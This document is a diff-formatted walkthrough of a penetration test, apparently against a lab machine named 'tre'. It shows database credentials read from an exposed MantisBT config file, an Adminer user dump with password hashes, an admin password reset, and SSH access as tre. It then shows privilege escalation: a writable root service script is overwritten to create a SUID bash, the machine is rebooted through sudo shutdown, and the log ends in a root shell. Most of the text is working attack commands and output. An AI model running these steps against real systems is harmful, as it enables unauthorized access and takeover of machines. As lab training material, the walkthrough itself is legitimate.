@@ -1,0 +1,134 @@
+
+
+
+http://192.168.241.84/mantisbt/config/a.txt
+
+# --- Database Configuration ---
+$g_hostname      = 'localhost';
+$g_db_username   = 'mantissuser';
+$g_db_password   = 'password@123AS';
+$g_database_name = 'mantis';
+$g_db_type       = 'mysqli';
+
+# --- Security ---
+$g_crypto_master_salt = 'dsf34H@sds$242347832842309843294829304djfkdjsfkd';	#  Random string of at least 16 chars, unique to the installation
+
+
+we use these creds to login at 
+http://192.168.241.84/adminer.php
+
+Adminer 4.7.7
+
+ Modify	id	username	realname	email	password	enabled	protected	access_level	login_count	lost_password_request_count	failed_login_count	cookie_string	last_visit	date_created
+ edit	1	administrator	XiBejMub	root@localhost	3492f8fe2cb409e387ddb0521c999c38	1	0	90	30	0	2	OHysKA8CiRbsM1LW0ZoWIF0gP6EGOwJovGZvGgJfDHkrPmaf2Y7qOVecYBxXDCri	1589342138	1
+ edit	2	tre	Tr3@123456A!	tre@localhost	64c4685f8da5c2225de7890c1bad0d7f	1	0	70	0	0	0	bp9uP3SY4tyKMFHSytb2RyecV5fPrsvGjb4sLboLkoyodEPn0NbZID9GhRURGAvf	1589263108	1589263108
+
+
+we update the pass
+The MD5 hash of NewPass123! is 762c59bc172a943c7d1877b3b7429e62
+
+we're in to 
+http://192.168.241.84/system/manage_proj_create_page.php
+
+but also, we try 
+
+ssh tre@192.168.241.84
+# when prompted, enter: Tr3@123456A!
+
+┌──(root㉿kali)-[/home/kali]
+└─# ssh tre@192.168.241.84
+The authenticity of host '192.168.241.84 (192.168.241.84)' can't be established.
+ED25519 key fingerprint is SHA256:1ZfYO3DGJA+iL5+oiLgoa4kQETeZ48YhrRrPnTvJb3A.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.241.84' (ED25519) to the list of known hosts.
+tre@192.168.241.84's password: 
+Linux tre 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2 (2020-04-29) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+tre@tre:~$ 
+
+tre@tre:~$ sudo -l
+Matching Defaults entries for tre on tre:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User tre may run the following commands on tre:
+    (ALL) NOPASSWD: /sbin/shutdown
+tre@tre:~$ 
+
+
+tre@tre:~$ find / -xdev -type f -writable ! -user $(whoami) -print 2>/dev/null
+/usr/bin/check-system
+...
+tre@tre:~$ 
+
+tre@tre:~$ ls -l /usr/bin/check-system
+-rw----rw- 1 root root 135 May 12  2020 /usr/bin/check-system
+tre@tre:~$ stat /usr/bin/check-system
+  File: /usr/bin/check-system
+  Size: 135       	Blocks: 8          IO Block: 4096   regular file
+Device: 801h/2049d	Inode: 533380      Links: 1
+Access: (0606/-rw----rw-)  Uid: (    0/    root)   Gid: (    0/    root)
+Access: 2025-10-07 23:02:59.722276959 -0400
+Modify: 2020-05-12 04:08:35.476577152 -0400
+Change: 2020-05-12 04:08:35.476577152 -0400
+ Birth: -
+tre@tre:~$ file /usr/bin/check-system
+/usr/bin/check-system: ASCII text
+tre@tre:~$ 
+tre@tre:~$ # see content (if script) or strings (if binary)
+tre@tre:~$ head -n 200 /usr/bin/check-system 2>/dev/null || true
+DATE=`date '+%Y-%m-%d %H:%M:%S'`
+echo "Service started at ${DATE}" | systemd-cat -p info
+
+while :
+do
+echo "Checking...";
+sleep 1;
+done
+
+tre@tre:~$ cat > /usr/bin/check-system <<'SH'
+> #!/bin/bash
+> cp /bin/bash /tmp/rootbash
+> chmod 4755 /tmp/rootbash
+> echo "owned-$(date +%s)" > /tmp/check-claimed
+> SH
+tre@tre:~$ ls -l /usr/bin/check-system
+-rw----rw- 1 root root 110 Oct  9 20:00 /usr/bin/check-system
+tre@tre:~$ cat /usr/bin/check-system
+#!/bin/bash
+cp /bin/bash /tmp/rootbash
+chmod 4755 /tmp/rootbash
+echo "owned-$(date +%s)" > /tmp/check-claimed
+tre@tre:~$ 
+
+tre@tre:~$ sudo /sbin/shutdown -r now
+tre@tre:~$ Connection to 192.168.241.84 closed by remote host.
+Connection to 192.168.241.84 closed.
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# ssh tre@192.168.241.84
+tre@192.168.241.84's password: 
+Linux tre 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2 (2020-04-29) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Thu Oct  9 19:46:34 2025 from 192.168.45.210
+tre@tre:~$ /tmp/rootbash -p
+rootbash-5.0# id
+uid=1000(tre) gid=1000(tre) euid=0(root) groups=1000(tre),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
+rootbash-5.0# 
+
+
+
+
+
